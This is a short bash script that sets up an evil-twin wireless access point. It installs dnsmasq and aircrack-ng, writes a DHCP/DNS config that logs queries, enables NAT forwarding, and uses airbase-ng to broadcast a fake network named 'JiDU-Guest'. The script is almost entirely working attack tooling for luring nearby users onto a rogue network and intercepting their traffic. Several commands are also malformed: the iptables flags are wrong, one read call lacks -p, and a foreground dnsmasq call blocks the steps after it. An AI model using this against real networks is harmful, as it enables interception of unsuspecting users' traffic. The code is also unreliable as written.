#!/bin/bash

sudo apt update
apt-get install -y dnsmasq aircrack-ng vim net-tools
cat > /etc/dnsmasq.conf << EOF
interface=at0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-dhcp
log-queries
EOF

read "interface name: " interface

dnsmasq -C /etc/dnsmasq.conf -d
iptables -flush
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -P FORWARD ACCEPT
iptables -append FORWARD -in-interface at0 ACCEPT
iptables -table -nat -append POSTROUTING -out-interface "$interface" -j MASQUERADE
iptables -t nat -A POSTROUTING -o "$interface" -j MASQUERADE

ifconfig at0 10.0.0.1/24 up
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

read -p "WiFi interface: " interface1

ifconfig "$interface1" down
iwconfig "$interface1" mode monitor
ifconfig "$interface1" up
airmon-ng start "$interface1"
airbase-ng -e "JiDU-Guest" -c 12 "$interface1"mon